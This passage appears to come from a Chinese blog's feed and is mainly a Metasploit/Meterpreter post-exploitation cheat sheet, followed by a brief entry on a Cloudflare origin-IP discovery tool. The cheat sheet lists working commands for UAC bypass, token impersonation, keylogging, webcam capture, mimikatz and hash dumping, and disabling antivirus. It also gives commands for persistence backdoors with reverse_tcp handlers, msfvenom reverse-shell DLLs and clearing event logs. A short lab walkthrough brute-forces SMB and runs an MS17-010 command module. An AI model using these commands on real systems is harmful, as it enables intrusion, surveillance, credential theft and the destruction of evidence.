class="hljs-keyword">show </span>payloads<br>查看所有auxiliary<br><span class="hljs-keyword">show </span>auxiliary<br>展示模块详细信息<br>info<br>查找模块<br>search name<br>查看当前运行的模块<br><span class="hljs-keyword">jobs</span><br><span class="hljs-keyword"></span>重启目标机器<br>reboot<br>关闭目标机器<br><span class="hljs-keyword">shutdown</span><br><span class="hljs-keyword"></span>获取交互<span class="hljs-keyword">shell</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">shell</span><br><span class="hljs-keyword"></span>当前meterpreter到后台<span class="hljs-keyword">background</span><br><span class="hljs-keyword"></span>离开msf<br>quit<br><br><br></code></pre></div></td></tr></table></figure><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a><strong>端口转发</strong></h2><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">portfwd add -l <span class="hljs-number">6666</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">3389</span> -<span class="hljs-attribute">r</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.2</span><br><br>常用参数：<br>-l：本地监听端口<br>-<span class="hljs-attribute">r</span>：内网目标的ip<br>-<span class="hljs-selector-tag">p</span>：内网目标的端口<br><br></code></pre></div></td></tr></table></figure><h2 id="设置Socks代理"><a href="#设置Socks代理" class="headerlink" title="设置Socks代理"></a><strong>设置<strong><strong>Socks</strong></strong>代理</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">Socks4a代理<br>    use auxiliary/server/socks4a <span class="hljs-built_in">set</span> srvhost 127.0.0.1<br>    <span class="hljs-built_in">set</span> srvport 1080<br>    <span class="hljs-built_in">run</span><br>Socks5代理<br>use auxiliary/server/socks5 <span class="hljs-built_in">set</span> USERNAME root<br>    <span class="hljs-built_in">set</span> PASSWORD Password@<br>    run<br></code></pre></div></td></tr></table></figure><h2 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a><strong>添加路由</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">获取网段信息<br><span class="hljs-built_in">run</span> get_local_subnets<br>查看帮助<br><span class="hljs-built_in">run</span> autoroute –h<br>添加到目标环境网络<br><span class="hljs-built_in">run</span> autoroute -s 192.168.0.1/24<br>打印添加的路由<br><span class="hljs-built_in">run</span> autoroute –p<br>删除路由<br><span class="hljs-built_in">run</span> autoroute -d -s 192.168.0.1/24<br></code></pre></div></td></tr></table></figure><h2 id="execute-执行文件"><a href="#execute-执行文件" class="headerlink" title="execute****执行文件"></a><strong>execute****执行文件</strong></h2><figure class="highlight smali"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs smali">在目标机中执行文件<span class="hljs-built_in"></span><br><span class="hljs-built_in">execute</span><br><span class="hljs-built_in"></span>创建新进程cmd.exe，-H不可见，-i交互execute -H -i -f cmd.exe<br>-f：指定可执行文件<br>-H：创建一个隐藏进程<br>-a：传递给命令的参数<br>-i：跟进程进行交互<br>-m：从内存中执行<br>-t： 使用当前伪造的线程令牌运行进程<br>-s： 在给定会话中执行进程<br></code></pre></div></td></tr></table></figure><h2 id="migrate-转移进程"><a href="#migrate-转移进程" class="headerlink" title="migrate****转移进程"></a><strong>migrate****转移进程</strong></h2><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">获取当前进程PID<br>getpid<br>获取进程列表<br><span class="hljs-built_in">ps</span><br>转移进程<br>migrate PID<br>杀死进程<br><span class="hljs-built_in">kill</span> PID<br>自动进程迁移<br>run post/windows/manage/migrate 监听设置自动转移进程<br><span class="hljs-built_in">set</span> autorunscript migrate <span class="hljs-operator">-f</span><br><br></code></pre></div></td></tr></table></figure><h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a><strong>令牌窃取</strong></h2><figure class="highlight smali"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs smali">使用模块<br>use incognito<br>查看可用token<br>list_tokens -u<br>假冒SYSTEM权限<br>impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27;利用假冒身份执行命令<span class="hljs-built_in"></span><br><span class="hljs-built_in">execute </span>-f cmd.exe -i –t<br>或者直接shell即可<br>返回原始权限<br>rev2self<br></code></pre></div></td></tr></table></figure><h2 id="提权相关"><a href="#提权相关" class="headerlink" title="提权相关"></a><strong>提权相关</strong></h2><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">加载特权提升扩展模块<br><span class="hljs-keyword">use</span> priv<br>获取更多的特权<br>getprivs<br>查看补丁信息<br><span class="hljs-keyword">run</span> <span class="hljs-keyword">post</span>/windows/gather/enum_patches<br>可利用exp提权检测<br><span class="hljs-keyword">use</span> <span class="hljs-keyword">post</span>/multi/recon/local_exploit_suggester<br>系统服务权限配置错误<br><span class="hljs-keyword">use</span> exploit/windows/<span class="hljs-keyword">local</span>/service_permissions<br>注册表键配置错误提取<br><span class="hljs-keyword">use</span> exploit/windows/<span class="hljs-keyword">local</span>/always_install_elevated 可信任服务路径<br><span class="hljs-keyword">use</span> exploit/windows/<span class="hljs-keyword">local</span>/trusted_service_path<br></code></pre></div></td></tr></table></figure><h2 id="bypassuac"><a href="#bypassuac" class="headerlink" title="bypassuac"></a><strong>bypassuac</strong></h2><figure class="highlight fortran"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs fortran"><span class="hljs-keyword">use</span> exploit/windows/<span class="hljs-keyword">local</span>/bypassuac<br><span class="hljs-keyword">use</span> exploit/windows/<span class="hljs-keyword">local</span>/bypassuac_injection <span class="hljs-keyword">use</span> windows/<span class="hljs-keyword">local</span>/bypassuac_vbs<br><span class="hljs-keyword">use</span> windows/<span class="hljs-keyword">local</span>/ask<br></code></pre></div></td></tr></table></figure><h2 id="键盘鼠标设置"><a href="#键盘鼠标设置" class="headerlink" title="键盘鼠标设置"></a><strong>键盘鼠标设置</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">禁用鼠标<br>uictl <span class="hljs-built_in">disable</span> mouse<br>禁用键盘<br>uictl <span class="hljs-built_in">disable</span> keyboard 启用鼠标<br>uictl <span class="hljs-built_in">enable</span> mouse<br>启用键盘<br>uictl <span class="hljs-built_in">enable</span> keyboard <br>键盘记录<br>    #开始键盘记录<br>    keyscan_start<br>    #导出记录数据<br>keyscan_dump<br>#结束键盘记录<br>keyscan_stop<br><br></code></pre></div></td></tr></table></figure><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a><strong>信息搜集</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">查看当前目录<br>pwd<br>getwd<br>查看目标主机信息<br>sysinfo<br>检查目标机器闲置时间<br>idletime<br>获取代理信息<br>getproxy<br>查看目标主机是否运行在虚拟机上<br><span class="hljs-built_in">run</span> checkvm<br><span class="hljs-built_in">run</span> post/windows/gather/checkvm<br>获取主机安装软件、补丁<br><span class="hljs-built_in">run</span> post/windows/gather/enum_applications<br>获取目标主机环境变量<br><span class="hljs-built_in">run</span> post/multi/gather/env<br>获取IE缓存<br><span class="hljs-built_in">run</span> post/windows/gather/enum_ie<br>获取Chrome缓存<br><span class="hljs-built_in">run</span> post/windows/gather/enum_chrome<br>获取Firefox缓存<br><span class="hljs-built_in">run</span> post/windows/gather/enum_firefox<br>列举当前登录的用户<br><span class="hljs-built_in">run</span> post/windows/gather/enum_logged_on_users 查找域控<br><span class="hljs-built_in">run</span> post/windows/gather/enum_domain<br>Windows凭证搜索<br><span class="hljs-built_in">run</span> post/windows/gather/enum_unattend<br>获取办公文档<br><span class="hljs-built_in">run</span> post/windows/gather/dumplinks<br>获取目标常见信息并保存到本地<br><span class="hljs-built_in">run</span> scraper<br>屏幕截图<br>screenshot<br></code></pre></div></td></tr></table></figure><h2 id="密码获取"><a href="#密码获取" class="headerlink" title="密码获取"></a><strong>密码获取</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">抓取自动登录的用户名和密码<br><span class="hljs-built_in">run</span> post/windows/gather/credentials/windows_autologin hashdump<br><span class="hljs-built_in">run</span> post/windows/gather/smart_hashdump<br><br>mimikatz<br>加载<br>    load mimikatz<br>    获取hash值<br>    msv<br>    获取明文<br>    Kerberos<br>    获取系统账户信息wdigest<br>获取域散列值<br>#使用psexec_ntdsgrab模块<br>    use auxiliary/admin/smb/psexec_ntdsgrab <span class="hljs-built_in">set</span> RHOST<br>    <span class="hljs-built_in">set</span> SMBDomain<br>    <span class="hljs-built_in">set</span> SMBUser<br>    <span class="hljs-built_in">set</span> SMBPass<br>    #基于meterpreter会话<br>use windows/gather/credentials/domain_hashdump <span class="hljs-built_in">set</span> session ID<br></code></pre></div></td></tr></table></figure><h2 id="流量抓取"><a href="#流量抓取" class="headerlink" title="流量抓取"></a><strong>流量抓取</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">查看网卡信息<br><span class="hljs-built_in">run</span> packetrecorder -L<br>查看流量<br><span class="hljs-built_in">run</span> packetrecorder -i &lt;网卡ID&gt; <br></code></pre></div></td></tr></table></figure><h2 id="端口扫描、主机发现"><a href="#端口扫描、主机发现" class="headerlink" title="端口扫描、主机发现"></a><strong>端口扫描、主机发现</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">使用arp发现主机<br><span class="hljs-built_in">run</span> post/windows/gather/arp_scanner <span class="hljs-attribute">RHOSTS</span>=192.168.159.0/24<br>扫描tcp端口<br><span class="hljs-built_in">run</span> auxiliary/scanner/portscan/tcp <span class="hljs-attribute">RHOSTS</span>=192.168.159.144 <span class="hljs-attribute">PORTS</span>=3389<br></code></pre></div></td></tr></table></figure><h2 id="防火墙、杀软"><a href="#防火墙、杀软" class="headerlink" title="防火墙、杀软"></a><strong>防火墙、杀软</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">关闭杀软<br><span class="hljs-built_in">run</span> killav<br>查看防火墙状态<br><span class="hljs-built_in">run</span> getcountermeasure<br><br>在shell中使用<br>netsh<span class="hljs-built_in"> firewall </span>show opmode<br></code></pre></div></td></tr></table></figure><h2 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a><strong>PowerShell</strong></h2><figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc">加载脚本模块<br>powershell<span class="hljs-emphasis">_import /root/Desktop/HostRecon.ps1 执行加载的脚本</span><br><span class="hljs-emphasis">powershell_</span>execute Invoke-HostRecon<br> <br></code></pre></div></td></tr></table></figure><h2 id="Hash-传递"><a href="#Hash-传递" class="headerlink" title="Hash****传递"></a><strong>Hash****传递</strong></h2><figure class="highlight actionscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs actionscript"><span class="hljs-keyword">use</span> exploit/windows/smb/psexec<br></code></pre></div></td></tr></table></figure><h2 id="摄像头、屏幕"><a href="#摄像头、屏幕" class="headerlink" title="摄像头、屏幕"></a><strong>摄像头、屏幕</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">查看摄像头信息webcam_list<br>使用摄像头拍照webcam_snap 屏幕监视<br><span class="hljs-built_in">run</span> vnc<br></code></pre></div></td></tr></table></figure><h2 id="开启远程桌面"><a href="#开启远程桌面" class="headerlink" title="开启远程桌面"></a><strong>开启远程桌面</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">开启远程桌面<br><span class="hljs-built_in">run</span> post/windows/manage/enable_rdp<br>添加用户<br><span class="hljs-built_in">run</span> post/windows/manage/enable_rdp <span class="hljs-attribute">USERNAME</span>=gugugu <span class="hljs-attribute">PASSWORD</span>=Root123456789 将3389端口转发到6662端口<br><span class="hljs-built_in">run</span> post/windows/manage/enable_rdp <span class="hljs-attribute">FORWARD</span>=<span class="hljs-literal">true</span> <span class="hljs-attribute">LPORT</span>=6662<br></code></pre></div></td></tr></table></figure><h2 id="cmdshell-升级"><a href="#cmdshell-升级" class="headerlink" title="cmdshell****升级"></a><strong>cmdshell****升级</strong></h2><figure class="highlight applescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs applescript">查看全部会话<br>sessions<br>选择会话<span class="hljs-number">1</span><br>sessions <span class="hljs-number">1</span><br>升级meterpreter<br>sessions -u 会话<span class="hljs-built_in">id</span><br></code></pre></div></td></tr></table></figure><h2 id="持久化控制后门"><a href="#持久化控制后门" class="headerlink" title="持久化控制后门"></a><strong>持久化控制后门</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> persistence -X -i 50 -p 4444 -r 192.168.1.7<br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp <span class="hljs-built_in">set</span> LHOST 192.168.109.137<br><span class="hljs-built_in">set</span> LPORT 4444<br>exploit<br></code></pre></div></td></tr></table></figure><h2 id="针对linux平台"><a href="#针对linux平台" class="headerlink" title="针对linux平台"></a><strong>针对<strong><strong>linux</strong></strong>平台</strong></h2><figure class="highlight dockerfile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dockerfile">目标主机保存的ssh身份验证信息<br><span class="hljs-keyword">run</span><span class="language-bash"> post/multi/gather/ssh_creds</span><br></code></pre></div></td></tr></table></figure><h2 id="擦屁股、清痕迹"><a href="#擦屁股、清痕迹" class="headerlink" title="擦屁股、清痕迹"></a><strong>擦屁股、清痕迹</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">删除添加的账号<br>C:\Windows\system32&gt; net<span class="hljs-built_in"> user </span>添加的用户名 /del 删除日志<br>clearev<br>关闭所有session连接<br>sessions -K<br>事件日志<br>    查看事件日志<br>    <span class="hljs-built_in">run</span> event_manager -i<br>    <br>    清除事件日志<br><span class="hljs-built_in">run</span> event_manager -c<br></code></pre></div></td></tr></table></figure><h2 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a><strong>生成木马</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">exe<br>msfvenom<br>dll<br>64位：<br>    msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=IP <span class="hljs-attribute">LPORT</span>=4444 -f dll &gt; bd64.dll <br>    32位：<br>    msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=IP <span class="hljs-attribute">LPORT</span>=4444 -f dll &gt; bd32.dll<br><br></code></pre></div></td></tr></table></figure><h1 id="爆破SMB："><a href="#爆破SMB：" class="headerlink" title="爆破SMB："></a>爆破SMB：</h1><figure class="highlight prolog"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs prolog"><span class="hljs-symbol">SMB</span> 对应的端口是 <span class="hljs-number">445</span><br><br>使用的是这个模块 ： uxiliary/scanner/portscan/tcp<br><br>msf5 auxiliary(scanner/portscan/tcp) &gt; exploit<br><br><span class="hljs-number">7</span> [*] <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.130</span>/<span class="hljs-number">24</span>: - <span class="hljs-symbol">Scanned</span> <span class="hljs-number">26</span> of <span class="hljs-number">256</span> hosts (<span class="hljs-number">10</span><span class="hljs-comment">% complete)</span><br><span class="hljs-number">8</span> [*] <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.130</span>/<span class="hljs-number">24</span>: - <span class="hljs-symbol">Scanned</span> <span class="hljs-number">56</span> of <span class="hljs-number">256</span> hosts (<span class="hljs-number">21</span><span class="hljs-comment">% complete)</span><br><span class="hljs-number">9</span> [*] <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.130</span>/<span class="hljs-number">24</span>: - <span class="hljs-symbol">Scanned</span> <span class="hljs-number">77</span> of <span class="hljs-number">256</span> hosts (<span class="hljs-number">30</span><span class="hljs-comment">% complete)</span><br><span class="hljs-number">10</span> [*] <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.130</span>/<span class="hljs-number">24</span>: - <span class="hljs-symbol">Scanned</span> <span class="hljs-number">103</span> of <span class="hljs-number">256</span> hosts (<span class="hljs-number">40</span><span class="hljs-comment">% complete)</span><br><span class="hljs-number">11</span> [+] <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.130</span>: - <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.130</span>:<span class="hljs-number">445</span> - <span class="hljs-symbol">TCP</span> <span class="hljs-symbol">OPEN</span><br><span class="hljs-number">12</span> [*] <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.130</span>/<span class="hljs-number">24</span>: - <span class="hljs-symbol">Scanned</span> <span class="hljs-number">128</span> of <span class="hljs-number">256</span> hosts (<span class="hljs-number">50</span><span class="hljs-comment">% complete)</span><br><span class="hljs-number">13</span> [*] <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.130</span>/<span class="hljs-number">24</span>: - <span class="hljs-symbol">Scanned</span> <span class="hljs-number">155</span> of <span class="hljs-number">256</span> hosts (<span class="hljs-number">60</span><span class="hljs-comment">% complete)</span><br><span class="hljs-number">14</span> [*] <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.130</span>/<span class="hljs-number">24</span>: - <span class="hljs-symbol">Scanned</span> <span class="hljs-number">180</span> of <span class="hljs-number">256</span> hosts (<span class="hljs-number">70</span><span class="hljs-comment">% complete)</span><br><span class="hljs-number">15</span> [*] <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.130</span>/<span class="hljs-number">24</span>: - <span class="hljs-symbol">Scanned</span> <span class="hljs-number">205</span> of <span class="hljs-number">256</span> hosts (<span class="hljs-number">80</span><span class="hljs-comment">% complete)</span><br><span class="hljs-number">16</span> [*] <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.130</span>/<span class="hljs-number">24</span>: - <span class="hljs-symbol">Scanned</span> <span class="hljs-number">231</span> of <span class="hljs-number">256</span> hosts (<span class="hljs-number">90</span><span class="hljs-comment">% complete)</span><br><span class="hljs-number">17</span> [*] <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.130</span>/<span class="hljs-number">24</span>: - <span class="hljs-symbol">Scanned</span> <span class="hljs-number">256</span> of <span class="hljs-number">256</span> hosts (<span class="hljs-number">100</span><span class="hljs-comment">% complete)</span><br><br>[*] <span class="hljs-symbol">Auxiliary</span> module execution completed<br><br>这边是有一台扫描出结果： <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.130</span>:<span class="hljs-number">445</span> - <span class="hljs-symbol">TCP</span> <span class="hljs-symbol">OPEN</span><br><br></code></pre></div></td></tr></table></figure><p><img src="/2025/01/25/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-1/image-20250127112115383.png" alt="image-20250127112115383"></p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">爆破<span class="hljs-built_in"> SMB </span>，爆破这个<span class="hljs-built_in"> IP </span>192.168.136.130:445<br>use auxiliary/scanner/smb/smb_login<br>设置完必要参数之后直接<span class="hljs-built_in">run</span><br>爆破出来密码为123456<br></code></pre></div></td></tr></table></figure><p><img src="/2025/01/25/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-1/image-20250127112219796.png" alt="image-20250127112219796"></p><h2 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a><strong>远程命令执行</strong></h2><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">有了 IP <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.130</span> , 账号 <span class="hljs-keyword">admin</span> ， 密码 <span class="hljs-number">123456</span> 之后，就可以使用 msf 的模块来<br>造成远程命令执行：<br>使用这个模块 auxiliary/<span class="hljs-keyword">admin</span>/smb/ms17_010_command<br>&gt;&gt;msf5 auxiliary(<span class="hljs-keyword">admin</span>/smb/ms17_010_command) &gt; <span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span><br>设置SMBPass还有command<br>run<br></code></pre></div></td></tr></table></figure><p><img src="/2025/01/25/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-1/image-20250127112352418.png" alt="image-20250127112352418"></p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>deepseekAPI的使用-python</title>
    <link href="/2025/01/25/deepseekAPI%E7%9A%84%E4%BD%BF%E7%94%A8-python/"/>
    <url>/2025/01/25/deepseekAPI%E7%9A%84%E4%BD%BF%E7%94%A8-python/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
    <tags>
      
      <tag>AI学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bypass_cf</title>
    <link href="/2025/01/07/bypass-cf/"/>
    <url>/2025/01/07/bypass-cf/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/musana/CF-Hero">https://github.com/musana/CF-Hero</a></p><p>绕过cloundflare寻找真实IP</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">go</span> install -v github.<span class="hljs-keyword">com</span>/musana/<span class="hljs-keyword">cf</span>-hero/cmd/<span class="hljs-keyword">cf</span>-hero@latest<br></code></pre></div></td></tr></table></figure><p><img src="/2025/01/07/bypass-cf/image-20250107130620331.png" alt="image-20250107130620331"></p><h1 id="Running-CF-Hero"><a href="#Running-CF-Hero" class="headerlink" title="Running CF-Hero"></a>Running CF-Hero</h1><p>The most basic running command. It checks A and TXT records by default.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cat</span> domains.txt | cf-hero</span><br></code></pre></div></td></tr></table></figure><p>or you can pass “f” parameter to 